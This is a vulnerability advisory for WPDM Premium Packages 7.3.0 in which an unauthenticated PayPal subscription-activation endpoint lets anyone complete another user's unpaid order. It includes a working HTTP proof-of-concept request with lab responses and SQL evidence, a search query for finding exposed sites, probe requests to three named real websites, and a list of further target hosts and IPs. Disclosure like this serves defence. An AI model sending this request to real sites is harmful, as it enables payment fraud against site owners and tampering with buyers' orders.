# Unauthenticated Subscription Activation in WPDM Premium Packages Can Alter Another User's Order Status

[简体中文](README.zh-CN.md)

- Discovery date: 2026-10-21
- Vulnerability type: Unauthorized access / unauthorized modification of order data

## Vulnerability description

WPDM Premium Packages (`wpdm-premium-packages`) is a commercial extension of the WordPress Download Manager plugin. It provides orders, subscriptions, licenses, and PayPal payment features for paid downloads. An internet asset search returned more than 2,000 matching records. The plugin exposes front-end checkout and subscription activation endpoints under the WordPress REST API namespace `/wpdmpp/v1/`.

The issue is in `POST /wp-json/wpdmpp/v1/checkout/paypal/activate-subscription`, registered at `src/Api/Endpoints/CheckoutEndpoint.php:147-148`. Its `permission_callback` is `__return_true`, allowing unauthenticated requests. In the callback, the order is checked only for existence: lines `958-964` call `getOrder($order_id)` and return `Order not found.` if no order is found. There is no check that the order belongs to the requester: the code neither compares the current user's `uid` nor requires a session or token. After the subsequent verification succeeds, it calls `updateOrder(['trans_id' => $subscription_id], $order_id)` at line `982` and `completeOrder($order_id, true, 'PayPal')` at line `985`. Consequently, a requester who supplies an order ID can mark another user's unpaid order as paid and completed.

## Impact

An unauthenticated attacker needs no account, Cookie, or token. With an order ID, the attacker can change another user's pending order to completed and write a forged payment transaction ID, thereby obtaining the paid content associated with that order without paying. The altered order state can also disrupt the legitimate buyer's payment, refund, and reconciliation processes.

The observed state change in the local reproduction was:

| Field | Before | After |
| --- | --- | --- |
| `order_status` | `Pending` | `Completed` |
| `payment_status` | `Pending` | `Completed` |
| `trans_id` | Empty | `I-NCCLAB-STUB-0001` |

The SQL comparison appears in [Observed impact](#observed-impact). As controls, the same endpoint returned `Order not found.` for a nonexistent order ID and `rest_missing_callback_param` for missing parameters, while a nonexistent route returned `rest_no_route`. These three responses were distinguishable.

## Vendor and affected version

- Vendor: Vedidero (WPDM / WPDM Premium Packages)
- Vendor's stated country/region: Germany
- Vendor repository: https://github.com/wp-premium-packages/wpdm-premium-packages
- Known affected version: WPDM Premium Packages 7.3.0
- Source version evidence: `wpdm-premium-packages.php:6` contains `* Version: 7.3.0`
- Release metadata evidence: `readme.txt:7` contains `Stable tag: 7.3.0`
- Latest-version evidence recorded in the source report: line 6 of `wpdm-premium-packages.php` on the repository's default branch still stated `Version: 7.3.0`; `readme.txt` stated `Stable tag: 7.3.0`

## Internet asset evidence

### Search query

```text
body="/wp-content/plugins/wpdm-premium-packages/"
```

### Search platform screenshot

![Figure 1-1. Search platform screenshot](assets/asset-discovery.png)

*Figure 1-1. Search platform screenshot*

## Technical details

### Proof of concept

`CheckoutEndpoint` registers `POST /wp-json/wpdmpp/v1/checkout/paypal/activate-subscription`. Its `permission_callback => __return_true` at line `148` allows unauthenticated access. The callback receives the string parameters `subscription_id` and `order_id`. After `getOrder()` finds the order, execution reaches `verifySubscription()`. If verification succeeds, the code calls `updateOrder()` to write `trans_id` and `completeOrder()` to complete the order. No step checks whether the requester owns the order.

Full request:

```http
POST /?rest_route=/wpdmpp/v1/checkout/paypal/activate-subscription HTTP/1.1
Host: 127.0.0.1:8911
Content-Type: application/json
User-Agent: NCC-lab

{"subscription_id":"I-NCCLAB-STUB-0001","order_id":"NCCLAB-PENDING-002"}
```

Response:

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=UTF-8

{"success":true,"data":{"order_id":"NCCLAB-PENDING-002","subscription_id":"I-NCCLAB-STUB-0001","redirect_url":""},"message":"Subscription activated successfully!"}
```

The `success:true` response and `Subscription activated successfully!` message indicate that the unauthenticated request reached the order-completion path. The corresponding database changes are shown in [Observed impact](#observed-impact).

### Trigger conditions

No login is required. The target site must have Download Manager and WPDM Premium Packages installed and enabled, and at least one order must exist. The report states that an attacker can enumerate order IDs because the endpoint does not check order ownership.

## Reproduction evidence

### Local reproduction

#### Environment

A local WordPress test site ran PHP 8.3.33 with Download Manager and WPDM Premium Packages 7.3.0. MariaDB ran separately at `127.0.0.1:3308`, and the site was served with `php -S 127.0.0.1:8911 -t .`. A pending order belonging to another user was inserted through SQL.

#### Trigger

The request above was sent without a Cookie, token, or any credential tying the requester to the order. The server returned `Subscription activated successfully!`.

#### Observed impact

```http
POST /?rest_route=/wpdmpp/v1/checkout/paypal/activate-subscription HTTP/1.1
Host: 127.0.0.1:8911
Content-Type: application/json

{"subscription_id":"I-NCCLAB-STUB-0001","order_id":"NCCLAB-PENDING-002"}
```

```http
HTTP/1.1 200 OK
{"success":true,"data":{"order_id":"NCCLAB-PENDING-002","subscription_id":"I-NCCLAB-STUB-0001","redirect_url":""},"message":"Subscription activated successfully!"}
```

The same order was queried before and after the request:

```sql
SELECT order_id, order_status, payment_status, trans_id
FROM wp_ahm_orders
WHERE order_id = 'NCCLAB-PENDING-002';
```

| State | order_id | order_status | payment_status | trans_id |
| --- | --- | --- | --- | --- |
| Before | `NCCLAB-PENDING-002` | `Pending` | `Pending` | Empty |
| After | `NCCLAB-PENDING-002` | `Completed` | `Completed` | `I-NCCLAB-STUB-0001` |

All three fields changed. The order belonged to another user (`uid=2`), and the requester supplied no credentials.

### Three external endpoint observations

In each case below, the report observed an endpoint that was reachable without authentication. A request to the actual route returned HTTP 400, while a request to a nonexistent route returned HTTP 404. These checks establish route presence and anonymous reachability; the state-changing request was reproduced locally as described above.

#### 1. https://mulib.mak.ac.ug

```http
POST /wp-json/wpdmpp/v1/checkout/paypal/activate-subscription HTTP/1.1
Host: mulib.mak.ac.ug
Content-Type: application/json
User-Agent: Mozilla/5.0 (compatible; NCC-verify)

{}
```

```http
HTTP 400 {"code":"rest_missing_callback_param","message":"Missing parameter(s): subscription_id, order_id","data":{"status":400}}
```

#### 2. https://www.we-link.com.tw

```http
POST /wp-json/wpdmpp/v1/checkout/paypal/activate-subscription HTTP/1.1
Host: www.we-link.com.tw
Content-Type: application/json
User-Agent: Mozilla/5.0 (compatible; NCC-verify)

{}
```

```http
HTTP 400 {"code":"rest_missing_callback_param","message":"Missing parameter(s): subscription_id, order_id","data":{"status":400}}
```

#### 3. https://hsebox.smatos.pt

```http
POST /wp-json/wpdmpp/v1/checkout/paypal/activate-subscription HTTP/1.1
Host: hsebox.smatos.pt
Content-Type: application/json
User-Agent: Mozilla/5.0 (compatible; NCC-verify)

{}
```

```http
HTTP 400 {"code":"rest_missing_callback_param","message":"Missing parameter(s): subscription_id, order_id","data":{"status":400}}
```

### Other targets listed in the source report

1. https://102.23.132.24
2. https://102.23.132.44
3. https://103.205.82.61
4. https://103.205.82.62
5. https://hsebox.smatos.pt

## Remediation

### Temporary mitigation

Require authentication for `/wp-json/wpdmpp/v1/checkout/paypal/activate-subscription` at the reverse proxy or WAF, or temporarily disable the PayPal subscription activation endpoint. Add server-side verification of payment callbacks before setting an order to completed.

### Permanent fix

1. Add an ownership check to `CheckoutEndpoint::activateSubscription()`: the order must belong to the currently authenticated user, or the request must carry a signed token bound to that order.
2. Replace `permission_callback => __return_true` with a check for the current user or an order-bound token.
3. Do not allow client-controlled parameters to trigger `completeOrder()` directly. Use a signed payment-gateway callback as the only order-completion entry point.
4. Make `order_id` difficult to enumerate by randomizing order IDs and rate limiting enumeration attempts.
